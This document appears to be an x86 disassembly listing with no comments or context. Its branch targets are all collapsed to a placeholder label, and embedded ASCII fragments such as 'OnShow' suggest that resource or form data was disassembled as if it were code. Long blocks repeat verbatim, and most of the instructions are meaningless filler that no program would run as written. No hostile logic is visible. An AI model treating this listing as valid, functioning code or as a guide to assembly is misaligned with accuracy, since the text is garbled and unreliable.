add al [ eax ]
inc [ eax + 0x10042f9 ]
push 0x6948776f
outsb
je r-xdata
adc [ eax ] al
test eax 0xdcff0001
loopne r-xdata
add [ eax ] al
xor [ 0x6e4f0a00 ] 0x44
push ebp
jo r-xdata
ja r-xdata
add [ eax + 0x10043e1 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
add bh bh
sbb [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
or [ edi + 0x6e ] cl
adc eax 0x2180041
sub eax [ ebx ]
lodsb [ esi ]
adc [ eax ] al
cdq
add [ eax ] al
add [ eax ] al
sub [ ecx ] 0x0
inc esp
add [ eax + eax ] bh
jmp [ edi + esi * 2 + 0x43 ]
add [ edx + 0x20ff0000 ] bl
jns r-xdata
push eax
popad
jb r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ es : ebx ] cl
add [ eax - 0x80000000 ] al
cmp [ eax ] al
inc esp
jb r-xdata
outsd
jo r-xdata
xor al 0x43
add [ eax ] dh
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0033 ] al
outsb
inc ebx
outsd
outsb
je r-xdata
inc ebx
push 0x65676e61
adc eax 0x1200041
add bh bh
and [ ecx ] al
add bh bh
pushad
cwde
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070031 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ edx ] al
add bh bh
xor [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
or [ edi + 0x6e ] ecx
add al [ eax ]
inc [ ecx ]
add ah bl
ja r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc eax 0x1c80041
jo r-xdata
outsb
jo r-xdata
add al [ eax ]
inc [ eax + 0x1ff0002 ]
jo r-xdata
add [ eax ] al
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080030 ] al
outsb
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5404002e ] al
js r-xdata
jns r-xdata
je r-xdata
inc ebp
outsb
inc esp
jb r-xdata
outsd
ja r-xdata
dec ebx
jns r-xdata
adc eax 0x1c00041
add bh bh
rol [ ecx ] 0x0
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07003b ] al
or cl [ edi + 0x6e ]
inc esp
jb r-xdata
cmp [ eax ] 0x0
add [ eax + 0x4f0a0036 ] al
inc ebx
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] 0x0
add [ eax + 0x4f09003a ] al
ja r-xdata
outsb
inc esp
jb r-xdata
dec edi
jb r-xdata
adc eax 0x1280041
add bh bh
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al 0x0
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
inc ebp
outsb
inc esp
add [ eax - 0x80000000 ] al
cmp [ eax ] eax
dec edi
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0037 ] al
outsb
inc esp
jb r-xdata
mov al 0xbc
inc edx
add [ eax - 0x7f00fffe ] al
add al [ eax ]
push eax
inc ebx
insb
outsd
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090032 ] al
outsb
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
int3
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0042 ] al
jo r-xdata
outsb
inc ebp
outsb
je r-xdata
sub eax 0x1d80043
add bh bh
fadd [ ecx ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp eax 0x6e4f0900
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp al 0x0
push es
dec edi
outsb
inc ebp
js r-xdata
enter 0x1 0xff
nop
das
inc ebx
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090039 ] al
outsb
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
jns r-xdata
jb r-xdata
outsd
arpl [ ebx - 0x70 ] bp
das
inc ebx
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
or [ edi + 0x6e ] ecx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop eax
int 0x42
jb r-xdata
jne r-xdata
mov ebp 0x2880042
add bh bh
mov [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc eax
add [ 0x654d6e4f ] cl
popad
jae r-xdata
insd
adc eax 0x2200041
add bh bh
and [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc ecx
and al 0x2e
inc ebx
add al ah
add [ eax ] eax
jmp eax
inc ecx
add [ eax ] ah
add al [ eax ]
jmp [ eax ]
jb r-xdata
push eax
add bh bh
adc eax 0x1c80041
outsb
dec edi
insd
adc eax 0x2280041
add bh bh
sub [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe941ca57
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0035 ] al
outsb
inc esp
inc ebx
insb
inc [ ecx ]
mov esp 0x2800042
add bh bh
add [ edx ] 0x0
jne r-xdata
je r-xdata
cmp [ ebx ] al
les esi [ eax + eax * 2 ]
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
inc esp
outsd
arpl [ ebx + 0x48 ] bp
das
inc ebx
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0043 ] al
popad
dec ecx
inc ecx
add [ edx + eax ] bh
add bh bh
or al 0x1
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc esp
add [ 0x6d657449 ] al
jae r-xdata
add al 0x21
jb r-xdata
add [ eax ] cl
dec edi
outsb
push ebx
insb
jae r-xdata
inc ebx
add [ ebx + ebp * 2 + 0x77080043 ] dh
inc ebx
add [ eax - 0x6bffbc8a ] al
jns r-xdata
add ah cl
mov al 0x41
add [ ebp + ebp * 4 - 0x5253ffbf ] dh
inc ecx
add ah dl
mov al 0x41
add [ eax + 0x54004307 ] bh
in eax 0x43
add [ eax - 0x16 ] dh
inc ebx
add [ ecx + ebp * 8 + 0x6af00043 ] bh
inc ebx
add [ eax ] dl
inc ebx
add [ eax ] dh
inc ebx
add [ ebp + ebx * 8 + 0x43 ] cl
add [ eax ] bh
push 0x43
add [ edx + ebp * 2 ] bh
inc ebx
add [ eax - 0x66 ] dl
inc ebx
add [ edx + ebx * 4 + 0x43 ] bh
add [ ebp + esi * 2 + 0x43 ] bh
inc ebx
add [ ebp + esi * 2 - 0x4f33ffbd ] dl
inc ecx
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0xcdb8c08b
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x42ce ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x5dffbd32 ] cl
into
inc edx
add [ edx + eax ] cl
add [ eax ] al
dec eax
cmp eax [ ebx ]
mov ah 0xb0
inc ecx
add al dl
xor al 0x40
add [ eax ] cl
stosb [ edi ]
inc ecx
add al bl
xor al 0x40
add ah ah
mov edx 0x322c0043
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ ebp + ebx * 4 - 0x15bfffbd ] bh
inc ebx
add [ edx + esi * 4 + 0x476c0043 ] ch
inc ecx
add [ eax + 0x7c004398 ] al
insb
inc ebx
add [ eax - 0x61 ] ah
add ah cl
xor al 0x40
inc eax
jb r-xdata
arpl [ gs : eax + edx * 2 + 0x31 ] si
inc ebx
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax + eax ] ch
add [ eax ] al
nop
fmul st4
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x33 ] bl
inc edx
outsb
push ebx
je r-xdata
dec edi
inc ebx
add [ ebx ] cl
je r-xdata
dec ecx
outsb
push ebx
je r-xdata
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edx
add [ ebx ] cl
dec edi
fsubr [ 0x1e80043 ]
add bh bh
call 0x241cbc4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07003f ] al
inc ebx
add [ eax + 0x500043df ] al
mov ebp 0xf1100043
inc ebx
add ah bh
fild [ ebx ]
in al dx
fiadd [ ebx ]
pop esp
or [ ebx ] al
or [ eax ] 0x43
add [ eax + eax ] al
cmp [ ebp - 0x10ffec ] bh
fcos
cld
or [ ebx ] al
dec eax
or [ ebx ] eax
or al 0x8
inc ebx
add [ eax + ecx + 0x43 ] dl
add [ esi ] cl
push esp
inc edx
jne r-xdata
add [ eax + 0x78 ] al
inc ebx
add [ eax + ecx - 0x653fffbd ] al
inc ebx
add [ eax + 0x5c0043dd ] ah
fiadd [ ebx ]
pop eax
fld [ ebx ]
inc eax
fiadd [ ebx ]
fcomp [ edi - 0x5993ffbd ]
inc ebx
add [ esp + esi * 4 ] cl
inc ebx
add [ ecx + ecx + 0x43 ] dh
add ah dh
mov al 0x43
add [ edi + ebp * 4 ] ah
inc ebx
add [ esp + esi * 4 - 0x4b57ffbd ] ah
inc ebx
add [ eax - 0x4d ] ah
inc ebx
add [ eax ] cl
mov bl 0x43
add ah dl
mov cl 0x41
add [ eax ] dl
inc ebx
add [ eax ] cl
mov dl 0x41
add [ edi - 0x4ea7ffbd ] bh
inc ecx
add ah ch
mov cl 0x41
add [ eax - 0x4e ] al
inc ecx
add ah bh
inc ebx
add [ edi + eax ] bl
inc ebx
add [ eax + 0x66 ] dh
inc ebx
add [ ecx + edi ] cl
inc esp
add [ eax - 0x17ffbc64 ] cl
inc ebx
add [ esi + 0x395c0043 ] ah
inc esp
add [ eax + 0x39 ] dh
inc esp
add ah bl
inc bx
add [ eax + 0x38004439 ] bl
inc ebx
add [ edi + eax + 0x43 ] dl
add [ eax + 0x67 ] bl
inc ebx
add [ eax - 0x6fffbbc7 ] ch
pushfd
inc ebx
add [ eax + ebp * 2 + 0x43 ] cl
add [ eax + ebp * 2 + 0x67780043 ] cl
inc ebx
add [ ecx + edi + 0x39c00044 ] bh
inc esp
add [ edi + 0x650c0043 ] bl
inc ebx
add [ ecx ] dl
push esp
inc edx
jne r-xdata
inc esp
jb r-xdata
add ah ah
mov edx 0x322c0043
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ ebp + ebx * 4 - 0x15bfffbd ] bh
inc ebx
je r-xdata
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax - 0x7ffbe4f ] ah
push es
inc ebx
add al 0x21
inc ebx
add [ eax + 0x500043df ] al
mov ebp 0xf1100043
inc ebx
add ah bh
fild [ ebx ]
in al dx
fiadd [ ebx ]
pop esp
or [ ebx ] al
or [ eax ] 0x43
add [ eax ] bh
or al [ ebx ]
or [ eax ] al
add eax 0x7b006b0
mov al 0x11
mov ebp 0x14bd35
jmp r-xdata
add [ eax + 0x78 ] al
inc ebx
add [ eax + ecx - 0x653fffbd ] al
inc ebx
add [ eax + 0x5c0043dd ] ah
fiadd [ ebx ]
pop eax
fld [ ebx ]
inc eax
fiadd [ ebx ]
fcomp [ edi - 0x5993ffbd ]
inc ebx
add [ esp + esi * 4 ] cl
inc ebx
add al al
or al [ ebx ]
hlt
fdiv [ eax + eax * 2 ]
outsb
inc ebx
outsd
outsb
je r-xdata
dec eax
[ eax ]
xor al [ eax ]
dec eax
xor al [ eax ]
mov esp 0x4000439d
0xb2ac0043 0x43
outsd
insb
lea eax [ eax ]
mov eax 0x70042ce
push cs
push esp
inc edx
jne r-xdata
add [ eax + 0x7c004398 ] al
insb
inc ebx
inc ebx
add [ edi + eax * 2 + 0x41 ] ch
je r-xdata
add [ edx + esi * 4 + 0x476c0043 ] ch
inc ecx
outsb
inc ebx
outsd
outsb
je r-xdata
add [ eax - 0x61 ] ah
inc ebx
add [ ebp + esi * 2 - 0x4f33ffbd ] dl
inc ecx
sbb [ eax + 0x6c7c0043 ] 0x43
outsd
insb
mov eax 0xfc0042cd
inc ebx
add [ ebx ] cl
add [ eax ] cl
push ebx
je r-xdata
inc ebx
add [ esp + ebp * 2 + 0x43 ] bh
inc ebx
je r-xdata
add [ ebp + ebp * 4 - 0x5253ffbf ] dh
inc ecx
add ah dl
mov al 0x41
add [ ecx + ecx - 0x1aabffbd ] ch
inc ebx
add [ eax - 0x16 ] dh
inc ebx
add [ ecx + ebp * 8 + 0x6af00043 ] bh
inc ebx
add [ eax ] dl
inc ebx
add [ eax ] dh
inc ebx
add [ ebp + ebx * 8 + 0x43 ] cl
add [ eax ] bh
push 0x43
add [ edx + ebp * 2 ] bh
inc ebx
add [ eax - 0x66 ] dl
inc ebx
add [ edx + ebx * 4 + 0x43 ] bh
add [ ebp + esi * 2 + 0x43 ] bh
add [ ebx + ebp * 2 + 0x77080043 ] dh
inc ebx
add [ eax - 0x6bffbc8a ] al
jns r-xdata
insb
jae r-xdata
add [ ebp - 0x30d3ffc0 ] cl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x30 ] al
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ edx ] 0x1
xor dl al
inc edx
add [ eax ] bl
add al [ eax ]
add [ ebp + ecx * 8 + 0x42 ] ch
add [ eax + esi * 4 + 0x34d00041 ] dh
inc eax
add [ eax ] cl
stosb [ edi ]
inc ecx
add al bl
xor al 0x40
sub_42c7bd
dec ecx
outsb
js r-xdata
jo r-xdata
adc [ eax ] al
or al 0x2
add bh bh
cmp al 0xed
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
or [ ebp + 0x61 ] ecx
js r-xdata
add [ eax + 0x1 ] al
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax 0x61500b00
jb r-xdata
outsb
outsb
je r-xdata
add [ eax ] al
outsb
je r-xdata
sub [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
je r-xdata
outsb
add [ edx ] cl
push eax
popad
jb r-xdata
outsd
insb
outsd
jb r-xdata
add [ ebx ] cl
add [ eax ] dl
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al 0x0
push cs
push eax
popad
jb r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
das
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x64656c62
adc eax 0x2180041
sub [ fs : ebx ] ch
inc ebx
add [ eax ] cl
loope r-xdata
add [ eax ] al
sub eax [ eax ]
push es
push ebx
outsd
jb r-xdata
add al [ eax ]
inc [ eax + 0x10042f9 ]
push 0x6948776f
outsb
je r-xdata
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
outsb
je r-xdata
adc [ eax ] al
test eax 0xdcff0001
loopne r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
daa
outsb
je r-xdata
add [ eax ] al
xor [ 0x6e4f0a00 ] 0x44
push ebp
jo r-xdata
ja r-xdata
add [ eax + 0x10043e1 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
or [ eax + 0x6f ] edx
add [ eax ] al
sub [ ecx ] 0x0
inc esp
add [ eax + eax ] bh
jmp [ edi + esi * 2 + 0x43 ]
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
jmp [ eax + 0x10043e1 ]
imul ebp [ esi + 0x74 ] r-xdata
jne r-xdata
outsd
outsb
je r-xdata
add [ edx + 0x20ff0000 ] bl
jns r-xdata
push eax
popad
jb r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ es : ebx ] cl
loope r-xdata
jo r-xdata
push cs
push eax
popad
jb r-xdata
je r-xdata
add [ eax ] al
add [ esi ] ah
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop edx
add [ eax ] al
push [ eax + 0x79 ]
add [ eax - 0x80000000 ] al
cmp [ eax ] al
inc esp
jb r-xdata
outsd
jo r-xdata
xor al 0x43
add [ eax ] dh
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0033 ] al
outsb
inc ebx
outsd
outsb
je r-xdata
inc ebx
push 0x65676e61
adc eax 0x1200041
add bh bh
and [ ecx ] al
add bh bh
pushad
cwde
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070031 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ edx ] al
add bh bh
xor [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
or [ edi + 0x6e ] ecx
add al [ eax ]
inc [ ecx ]
add ah bl
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
cmp cl 0x42
add [ ecx ] al
add bh bh
adc [ eax ] al
0x20ff0000 0x4379
adc [ eax ] al
cdq
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cwde
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub eax 0x61540700
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
inc ebx
outsb
jne r-xdata
jo r-xdata
outsd
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
fdivr [ eax + 0x43 ]
add [ ecx ] al
add [ eax ] al
adc eax 0x1c80041
jo r-xdata
outsb
jo r-xdata
add al [ eax ]
inc [ eax + 0x1ff0002 ]
jo r-xdata
add [ eax ] al
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080030 ] al
outsb
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5404002e ] al
js r-xdata
add bh bh
sbb [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
or [ edi + 0x6e ] cl
adc eax 0x2180041
sub eax [ ebx ]
lodsb [ esi ]
jns r-xdata
je r-xdata
inc ebp
outsb
inc esp
jb r-xdata
outsd
ja r-xdata
dec ebx
jns r-xdata
adc eax 0x1c00041
add bh bh
rol [ ecx ] 0x0
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07003b ] al
or cl [ edi + 0x6e ]
inc esp
jb r-xdata
cmp [ eax ] 0x0
add [ eax + 0x4f0a0036 ] al
inc ebx
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] 0x0
add [ eax + 0x4f09003a ] al
ja r-xdata
outsb
inc esp
jb r-xdata
dec edi
jb r-xdata
adc eax 0x1280041
add bh bh
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al 0x0
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
inc ebp
outsb
inc esp
add [ eax - 0x80000000 ] al
cmp [ eax ] eax
dec edi
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0037 ] al
outsb
inc esp
jb r-xdata
mov al 0xbc
inc edx
add [ eax - 0x7f00fffe ] al
add al [ eax ]
push eax
inc ebx
insb
outsd
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090032 ] al
outsb
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
int3
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0042 ] al
jo r-xdata
outsb
inc ebp
outsb
je r-xdata
sub eax 0x1d80043
add bh bh
fadd [ ecx ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp eax 0x6e4f0900
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp al 0x0
push es
dec edi
outsb
inc ebp
js r-xdata
enter 0x1 0xff
nop
das
inc ebx
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090039 ] al
outsb
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
jns r-xdata
jb r-xdata
outsd
arpl [ ebx - 0x70 ] bp
das
inc ebx
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
or [ edi + 0x6e ] ecx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop eax
int 0x42
jb r-xdata
jne r-xdata
mov ebp 0x2880042
add bh bh
mov [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc eax
add [ 0x654d6e4f ] cl
popad
jae r-xdata
insd
adc eax 0x2200041
add bh bh
and [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc ecx
and al 0x2e
inc ebx
add al ah
add [ eax ] eax
jmp eax
inc ecx
add [ eax ] ah
add al [ eax ]
jmp [ eax ]
jb r-xdata
push eax
add bh bh
adc eax 0x1c80041
outsb
dec edi
insd
adc eax 0x2280041
add bh bh
sub [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe941ca57
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0035 ] al
outsb
inc esp
inc ebx
insb
inc [ ecx ]
mov esp 0x2800042
add bh bh
add [ edx ] 0x0
jne r-xdata
je r-xdata
cmp [ ebx ] al
les esi [ eax + eax * 2 ]
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
inc esp
outsd
arpl [ ebx + 0x48 ] bp
das
inc ebx
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0043 ] al
popad
dec ecx
inc ecx
add [ edx + eax ] bh
add bh bh
or al 0x1
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc esp
add [ 0x6d657449 ] al
jae r-xdata
add al 0x21
jb r-xdata
add [ eax ] cl
dec edi
outsb
push ebx
insb
jae r-xdata
inc ebx
add [ ebx + ebp * 2 + 0x77080043 ] dh
inc ebx
add [ eax - 0x6bffbc8a ] al
jns r-xdata
add ah cl
mov al 0x41
add [ ebp + ebp * 4 - 0x5253ffbf ] dh
inc ecx
add ah dl
mov al 0x41
add [ eax + 0x54004307 ] bh
in eax 0x43
add [ eax - 0x16 ] dh
inc ebx
add [ ecx + ebp * 8 + 0x6af00043 ] bh
inc ebx
add [ eax ] dl
inc ebx
add [ eax ] dh
inc ebx
add [ ebp + ebx * 8 + 0x43 ] cl
add [ eax ] bh
push 0x43
add [ edx + ebp * 2 ] bh
inc ebx
add [ eax - 0x66 ] dl
inc ebx
add [ edx + ebx * 4 + 0x43 ] bh
add [ ebp + esi * 2 + 0x43 ] bh
inc ebx
add [ ebp + esi * 2 - 0x4f33ffbd ] dl
inc ecx
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0xcdb8c08b
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x42ce ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x5dffbd32 ] cl
into
inc edx
add [ edx + eax ] cl
add [ eax ] al
dec eax
cmp eax [ ebx ]
mov ah 0xb0
inc ecx
add al dl
xor al 0x40
add [ eax ] cl
stosb [ edi ]
inc ecx
add al bl
xor al 0x40
add ah ah
mov edx 0x322c0043
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ ebp + ebx * 4 - 0x15bfffbd ] bh
inc ebx
add [ edx + esi * 4 + 0x476c0043 ] ch
inc ecx
add [ eax + 0x7c004398 ] al
insb
inc ebx
add [ eax - 0x61 ] ah
add ah cl
xor al 0x40
inc eax
jb r-xdata
arpl [ gs : eax + edx * 2 + 0x31 ] si
inc ebx
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax + eax ] ch
add [ eax ] al
nop
fmul st4
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x33 ] bl
inc edx
outsb
push ebx
je r-xdata
dec edi
inc ebx
add [ ebx ] cl
je r-xdata
dec ecx
outsb
push ebx
je r-xdata
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edx
add [ ebx ] cl
dec edi
fsubr [ 0x1e80043 ]
add bh bh
call 0x241cbc4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07003f ] al
inc ebx
add [ eax + 0x500043df ] al
mov ebp 0xf1100043
inc ebx
add ah bh
fild [ ebx ]
in al dx
fiadd [ ebx ]
pop esp
or [ ebx ] al
or [ eax ] 0x43
add [ eax + eax ] al
cmp [ ebp - 0x10ffec ] bh
fcos
cld
or [ ebx ] al
dec eax
or [ ebx ] eax
or al 0x8
inc ebx
add [ eax + ecx + 0x43 ] dl
add [ esi ] cl
push esp
inc edx
jne r-xdata
add [ eax + 0x78 ] al
inc ebx
add [ eax + ecx - 0x653fffbd ] al
inc ebx
add [ eax + 0x5c0043dd ] ah
fiadd [ ebx ]
pop eax
fld [ ebx ]
inc eax
fiadd [ ebx ]
fcomp [ edi - 0x5993ffbd ]
inc ebx
add [ esp + esi * 4 ] cl
inc ebx
add [ ecx + ecx + 0x43 ] dh
add ah dh
mov al 0x43
add [ edi + ebp * 4 ] ah
inc ebx
add [ esp + esi * 4 - 0x4b57ffbd ] ah
inc ebx
add [ eax - 0x4d ] ah
inc ebx
add [ eax ] cl
mov bl 0x43
add ah dl
mov cl 0x41
add [ eax ] dl
inc ebx
add [ eax ] cl
mov dl 0x41
add [ edi - 0x4ea7ffbd ] bh
inc ecx
add ah ch
mov cl 0x41
add [ eax - 0x4e ] al
inc ecx
add ah bh
inc ebx
add [ edi + eax ] bl
inc ebx
add [ eax + 0x66 ] dh
inc ebx
add [ ecx + edi ] cl
inc esp
add [ eax - 0x17ffbc64 ] cl
inc ebx
